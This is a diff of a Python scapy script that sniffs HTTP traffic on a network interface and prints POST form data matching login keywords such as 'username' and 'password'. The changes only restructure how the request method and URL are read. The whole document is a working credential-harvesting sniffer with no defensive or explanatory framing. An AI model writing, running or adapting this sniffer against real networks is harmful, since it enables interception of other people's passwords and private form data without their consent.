@@ -18,26 +18,24 @@ def sniff(interface):
 
 def packet_processer(packet):
     if packet.haslayer(http.HTTPRequest):
-        #retrieve the HTTPRequest layer that represents the HTTP request headers and fields in the packet and save it.
-        http_layer = packet.getlayer(http.HTTPRequest)
-        #extract method, URL and the folder as a bytes, decode the URL and the folder
-        method = http_layer.Method
-        host = http_layer.Host.decode('utf-8')
-        path = http_layer.Path.decode('utf-8')
+        # retrieve the HTTPRequest Method from the HTTP request headers
+        method = packet[http.HTTPRequest].Method
+        # retrieve the URL used for login
+        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
         if method == b"POST":
-            #check if the packet has the Raw section and save the load part containing the form data
+            # check if the packet has the Raw section and save the load part containing the form data
             if packet.haslayer(scapy.Raw):
                 load = packet[scapy.Raw].load
                 #decode the load
                 try:
                     load_str = load.decode('utf-8')
-                #decoding with errors ignored
+                # decoding with errors ignored
                 except UnicodeDecodeError:
                     load_str = load.decode('utf-8', errors='ignore')
                 keywords = ["login", "user", "username", "uname", "pass", "password", "passwd", "&", "="]
                 for keyword in keywords:
                     if keyword in load_str:
-                        print(f"Potential login form data for {host}{path}: {load_str}")
+                        print(f"Potential login form data for {url.decode('utf-8')}: {load_str}")
                         break
 
 sniff("eth0")
